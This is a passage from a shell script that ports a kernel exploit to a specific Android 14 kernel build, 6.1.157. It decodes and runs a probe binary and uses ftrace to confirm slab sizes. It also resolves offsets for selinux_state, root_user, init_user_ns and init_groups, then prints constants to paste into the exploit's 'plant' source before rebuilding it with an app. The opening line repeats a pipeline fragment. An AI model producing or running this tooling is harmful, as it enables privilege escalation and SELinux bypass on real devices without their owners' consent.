AAAAAAAAAAAAAAAAAAAAAOAAAAAAAAhgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAB+AAAAAwAAAAAAAAAAAAAAAAAAAAAAAACGDgAAAAAAAEIAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA' | base64 -d > "$WORK/x6873_probe" 2>/dev/null || die "prober decode failed" | base64 -d > "$WORK/x6873_probe" 2>/dev/null || die "prober decode failed"
    chmod 755 "$WORK/x6873_probe"
    PROBE_BIN="$WORK/x6873_probe"
fi

printf '%s' 0 > "$TR/tracing_on" 2>/dev/null
: > "$TR/trace" 2>/dev/null
printf '%s' 1 > "$EVT"
[ -n "$T_E2_SAVED" ] && printf '%s' 1 > "$EVT_NODE" 2>/dev/null

"$PROBE_BIN" > "$WORK/probe.out" 2>&1 &
P=$!
wait "$P"
PRC=$?

printf '%s' 0 > "$EVT"
[ -n "$T_E2_SAVED" ] && printf '%s' 0 > "$EVT_NODE" 2>/dev/null
printf '%s' "${T_ON_SAVED:-0}" > "$TR/tracing_on" 2>/dev/null

if grep -q PROBE_TIMER_OK "$WORK/probe.out" 2>/dev/null && \
   grep -q PROBE_DONE "$WORK/probe.out" 2>/dev/null; then
    CONFIRM_TIMER_ALLOC=$(find_alloc_rec "$SZ_TIMER" "$OFF_TIMER" "$P")
    if [ -z "$CONFIRM_TIMER_ALLOC" ]; then
        die "prober fired but its timer alloc does not match the kallsyms-derived site $(hexaddr "$OFF_TIMER") — send back $WORK/probe.out"
    fi
    CONFIRM_TASK_ALLOC=$(find_alloc_rec "$SZ_TASK" "$OFF_TASK" "$P")
    if [ -z "$CONFIRM_TASK_ALLOC" ]; then
        die "prober fired but its task alloc does not match the kallsyms-derived site $(hexaddr "$OFF_TASK") — send back $WORK/probe.out"
    fi
    CONFIRM=prober
    say "[ok] prober confirmation: timer/task allocs at the kallsyms-derived sites (exit $PRC)"
else
    say "[warn] prober failed (exit $PRC) — continuing on the passive window"
    dump_probe_out

    # (b) passive 2 s all-pid window: the bundle saw 139 timer allocs
    # from 15 pids and constant fork churn, so natural system activity
    # produces the same records without executing anything.
    if command -v sleep >/dev/null 2>&1; then
        printf '%s' 512 > "$TR/buffer_size_kb" 2>/dev/null || \
            say "[warn] could not raise buffer_size_kb (using current size)"
        printf '%s' 0 > "$TR/tracing_on" 2>/dev/null
        : > "$TR/trace" 2>/dev/null
        printf '%s' 1 > "$EVT"
        [ -n "$T_E2_SAVED" ] && printf '%s' 1 > "$EVT_NODE" 2>/dev/null
        sleep 2
        printf '%s' 0 > "$EVT"
        [ -n "$T_E2_SAVED" ] && printf '%s' 0 > "$EVT_NODE" 2>/dev/null
        printf '%s' "${T_ON_SAVED:-0}" > "$TR/tracing_on" 2>/dev/null
        [ -n "$T_BUF_SAVED" ] && printf '%s' "$T_BUF_SAVED" > "$TR/buffer_size_kb" 2>/dev/null
        CONFIRM_TIMER_ALLOC=$(find_alloc_rec "$SZ_TIMER" "$OFF_TIMER" "")
        if [ -n "$CONFIRM_TIMER_ALLOC" ]; then
            CONFIRM_TASK_ALLOC=$(find_alloc_rec "$SZ_TASK" "$OFF_TASK" "")
            if [ -n "$CONFIRM_TASK_ALLOC" ]; then
                CONFIRM=passive
                say "[ok] passive window confirmation: timer/task allocs at the kallsyms-derived sites"
            fi
        fi
        [ "$CONFIRM" = "passive" ] || \
            say "[warn] passive window found no matching allocs — trace confirmation unavailable"
    else
        say "[warn] no sleep binary — passive window skipped"
    fi
fi

if [ "$CONFIRM" = "none" ]; then
    TIMER_ALLOC_V=$BAKED_TIMER_ALLOC; TASK_ALLOC_V=$BAKED_TASK_ALLOC
    say "[warn] slab padded sizes emitted from the baked bundle values (no fresh trace)"
    say "[warn] call sites stand on kallsyms + anchor-pinned slide; build identity is gated"
    say "[warn]  by the three-anchor agreement and the low21 disambiguation windows"
else
    is_int "$CONFIRM_TIMER_ALLOC" && is_int "$CONFIRM_TASK_ALLOC" || \
        die "confirmation records carry no bytes_alloc - report this output"
    TIMER_ALLOC_V=$CONFIRM_TIMER_ALLOC
    TASK_ALLOC_V=$CONFIRM_TASK_ALLOC
    [ "$TIMER_ALLOC_V" = "$BAKED_TIMER_ALLOC" ] || \
        die "fresh timer bytes_alloc $TIMER_ALLOC_V != bundle 0x140 — same release but different slab geometry is inconsistent, report this"
    [ "$TASK_ALLOC_V" = "$BAKED_TASK_ALLOC" ] || \
        die "fresh task bytes_alloc $TASK_ALLOC_V != bundle 0x12c0 — same release but different slab geometry is inconsistent, report this"
    say "[ok] fresh slab padded sizes match the bundle (timer 0x140, task 0x12c0)"
fi

# ------------------------------------------------- 7. selinux cross-check
if [ -n "$RT_selinux_state" ]; then
    SEL_OFF=$(loff "$RT_selinux_state") || SEL_OFF=""
    if [ -n "$SEL_OFF" ]; then
        SEL_DELTA=$(( SEL_OFF - A_SELINUX_ENFORCING ))
        say "[info] selinux_state symbol $(hexaddr "$SEL_OFF") vs measured enforcing offset 0x225b820: delta $SEL_DELTA ($(sxoff "$SEL_DELTA"); small negative = enforcing field near struct start, the plant constant uses the measured address)"
        if [ "$SEL_DELTA" -lt -256 ] || [ "$SEL_DELTA" -gt 256 ]; then
            say "[warn] selinux delta is large - the measured enforcing address and the kallsyms symbol do not line up; double-check before trusting the prefilled constant"
        fi
    else
        say "[warn] selinux_state resolves outside the port frame - cross-check skipped"
    fi
else
    say "[warn] selinux_state not in kallsyms - cross-check skipped (prefilled constant stands)"
fi

# ------------------------------------------------------------- 8. output
emit_sym() { # $1 = RT_ variable name
    eval "v=\$RT_$1"
    if [ -n "$v" ]; then
        o=$(loff "$v") && { hexaddr "$o"; return 0; }
    fi
    echo "0x0"
}

CONFIRM_TAG="kallsyms+anchors"
[ "$CONFIRM" = "prober" ]  && CONFIRM_TAG="kallsyms+prober-trace"
[ "$CONFIRM" = "passive" ] && CONFIRM_TAG="kallsyms+passive-trace"

say ""
say "================ paste into exploit/src/K61157_plant.c (profile row) ==============="
say "    {"
say "        \"6.1.157-android14-11-ga8b0b542991e-ab15601211\","
say "        $(hexaddr "$OFF_TIMER")ULL,  /* timer_site    ($CONFIRM_TAG) */"
say "        $(printf '0x%x' "$LOW21_TIMER")ULL,  /* timer_low21   (bundle-baked, re-derived) */"
say "        $(printf '0x%x' "$LOW21_TASK")ULL,  /* copy_low21    (bundle-baked, re-derived) */"
say "        0xffffffc08225b827ULL, /* selinux_state (prefilled, measured) */"
say "        $(emit_sym panic_on_warn)ULL,  /* panic_on_warn */"
say "        $(emit_sym root_user)ULL,  /* root_user     */"
say "        $(emit_sym init_user_ns)ULL,  /* init_user_ns  */"
say "        $(emit_sym init_ucounts)ULL,  /* init_ucounts  */"
say "        $(emit_sym init_groups)ULL,  /* init_groups   */"
say "    },"
say ""
say "================ paste into plant_core.inc (X6873_61157 branch) ==================="
say "#define TIMER_REQ  0x$(printf '%x' "$BAKED_TIMER_REQ")ULL   /* slabinfo objsize: $SZ_TIMER */"
say "#define TIMER_ALLOC 0x$(printf '%x' "$TIMER_ALLOC_V")ULL"
say "#define CRED_REQ  0x$(printf '%x' "$BAKED_CRED_REQ")ULL   /* slabinfo objsize: $SZ_CRED */"
say "#define CRED_ALLOC 0x$(printf '%x' "$BAKED_CRED_ALLOC")ULL"
say "#define TASK_ALLOC_BYTES 0x$(printf '%x' "$BAKED_TASK_REQ")ULL   /* slabinfo objsize: $SZ_TASK */"
say "#define TASK_ALLOC_PADDED 0x$(printf '%x' "$TASK_ALLOC_V")ULL"
say ""
say "Then rebuild: ./exploit/build-all.sh && (cd app && ./gradlew :app:assembleRelease)"
say "The pending guard in K61157_plant.c clears itself once every field is non-zero."

trace_restore
if [ "$CONFIRM" = "none" ]; then
    say "[done] workdir KEPT for inspection: $WORK (send back $WORK/probe.out if the prober failed)"
else
    rm -rf "$WORK"
    say "[done] workdir cleaned"
fi
